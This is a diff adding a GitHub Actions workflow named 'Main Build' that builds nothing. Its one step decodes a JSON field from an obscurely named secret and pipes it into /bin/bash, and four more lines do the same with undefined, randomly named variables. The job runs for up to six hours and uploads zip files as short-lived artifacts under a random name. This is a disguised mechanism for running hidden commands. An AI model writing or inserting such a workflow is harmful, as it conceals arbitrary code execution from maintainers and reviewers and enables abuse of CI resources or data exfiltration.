@@ -1,0 +1,29 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          ta377: ${{ secrets.ta377 }}
+        run: |
+          printf '%s' "$ta377" | jq -r .o18276 | /bin/bash
+          echo $riu52306 | jq -r .mpb1 | /bin/bash
+          echo $y6 | jq -r .s64 | /bin/bash
+          printf '%s' "$y44931" | jq -r .dlflh81 | /bin/bash
+          echo $sguov099 | jq -r .qmloi3663 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: j5v2uUcF
+          path: "*.zip"
+          retention-days: 1
